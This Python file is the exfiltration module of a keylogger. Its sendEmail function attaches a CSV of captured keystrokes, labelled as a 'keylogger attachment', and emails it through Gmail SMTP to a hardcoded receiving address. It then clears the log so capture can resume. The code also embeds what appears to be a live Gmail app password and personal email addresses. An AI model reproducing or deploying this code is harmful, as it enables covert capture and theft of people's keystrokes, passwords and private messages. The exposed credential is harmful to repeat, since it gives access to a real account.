import email, smtplib, ssl
from email import encoders
from email.mime.base import MIMEBase
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
import csv

def sendEmail(tetxt):
    subject = tetxt
    body = "This is an email with keylogger attachment sent from Python"
    sender_email = "100motivationmindset100@gmail.com"
    receiver_email = "223souvikchakraborty@gmail.com"   
    password = "dbakeaaaqpuehdmt"  #Google App password and 2-step verification must be on 

    # Create a multipart message and set headers
    message = MIMEMultipart()
    message["From"] = sender_email
    message["To"] = receiver_email
    message["Subject"] = subject

    # Add body to email
    message.attach(MIMEText(body, "plain"))
    filename = "Datafile\data.csv" 
    name = "data.csv"

    # Open CSV file 
    with open(filename, "rb") as attachment:
        part = MIMEBase("application", "octet-stream")
        part.set_payload(attachment.read())

    # Encode file in ASCII characters to send by email    
    encoders.encode_base64(part)

    # Add header as key/value pair to attachment part
    part.add_header(
        "Content-Disposition",
        f"attachment; filename = {name}",
    )

    # Add attachment to message and convert message to string
    message.attach(part)
    text = message.as_string()

    # Log in to server using secure context and send email
    context = ssl.create_default_context()
    with smtplib.SMTP_SSL("smtp.gmail.com", 465, context=context) as server:
        server.login(sender_email, password)
        server.sendmail(sender_email, receiver_email, text)
        
    #Clearing the data file for new data entry :
    with open('Datafile/data.csv', mode ='w', newline='') as file:
     csvwriter = csv.writer(file) 
     csvwriter.writerows([['TIMESTAMP', 'KEY PRESSED']])

